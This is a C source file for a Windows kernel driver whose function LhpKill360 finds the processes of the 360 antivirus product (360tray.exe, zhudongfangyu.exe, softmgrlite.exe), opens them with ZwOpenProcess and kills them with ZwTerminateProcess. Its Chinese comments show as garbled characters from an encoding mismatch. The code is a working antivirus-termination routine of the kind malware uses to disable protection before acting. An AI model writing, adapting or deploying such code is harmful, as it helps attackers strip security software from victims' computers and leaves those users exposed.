#include "Kill360.h"
#include "ToolFunction.h"

typedef struct _PROCESS_INFO
{
	PWCHAR ProcessName;
	HANDLE ProcessId;
	HANDLE ProcessHandle;
}PROCESS_INFO, *PPROCESS_INFO;

PROCESS_INFO Lhp360ProcessTable[] = {
	{L"360tray.exe", 0, 0},
	{L"zhudongfangyu.exe", 0, 0},
	{L"softmgrlite.exe", 0, 0}
};


NTSTATUS LhpKill360()
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	ULONG Index = 0;

	//DbgBreakPoint();

	//
	// ��ȡ360��ؽ��̵�PID
	//
	for (Index = 0; Index < sizeof(Lhp360ProcessTable)/sizeof(Lhp360ProcessTable[0]); Index++)
	{
		LhpGetProcessIdByName(Lhp360ProcessTable[Index].ProcessName, &Lhp360ProcessTable[Index].ProcessId);
	}

	//
	// ��ӡ��ȡ�Ľ���ID
	//
#ifdef DBG
	for (Index = 0; Index < sizeof(Lhp360ProcessTable)/sizeof(Lhp360ProcessTable[0]); Index++)
	{
		KdPrint(("ProcessName: %ws    ProcessId: %d\n", Lhp360ProcessTable[Index].ProcessName, Lhp360ProcessTable[Index].ProcessId));
	}
#endif

	//
	// �򿪽��̻�ȡHANDLE
	//
	for (Index = 0; Index < sizeof(Lhp360ProcessTable)/sizeof(Lhp360ProcessTable[0]); Index++)
	{
		CLIENT_ID Cid;
		OBJECT_ATTRIBUTES ObjectAttributes;

		if (Lhp360ProcessTable[Index].ProcessId == 0)
		{
			continue;
		}

		Cid.UniqueProcess = Lhp360ProcessTable[Index].ProcessId;
		Cid.UniqueThread = 0;

		InitializeObjectAttributes(&ObjectAttributes, NULL, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

		Status = ZwOpenProcess(&(Lhp360ProcessTable[Index].ProcessHandle), SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | SPECIFIC_RIGHTS_ALL, &ObjectAttributes, &Cid);
		if (NT_SUCCESS(Status))
		{
			KdPrint(("Open Process %ws successful!\n", Lhp360ProcessTable[Index].ProcessName));
		}
		else
		{
			KdPrint(("Open Process %ws failed! return 0x%08X\n", Lhp360ProcessTable[Index].ProcessName, Status));
		}
	}

	//
	// ����ɱ���̺�����ɱ
	//
	for (Index = 0; Index < sizeof(Lhp360ProcessTable)/sizeof(Lhp360ProcessTable[0]); Index++)
	{
		if (Lhp360ProcessTable[Index].ProcessId == 0 || Lhp360ProcessTable[Index].ProcessHandle == NULL)
		{
			continue;
		}

		Status = ZwTerminateProcess(Lhp360ProcessTable[Index].ProcessHandle, 0);
		if (NT_SUCCESS(Status))
		{
			KdPrint(("Kill Process %ws successful!\n", Lhp360ProcessTable[Index].ProcessName));
		}
		else
		{
			KdPrint(("Kill Process %ws failed! return 0x%08X\n", Lhp360ProcessTable[Index].ProcessName, Status));
		}
		ZwClose(Lhp360ProcessTable[Index].ProcessHandle);
	}

	return Status;
}
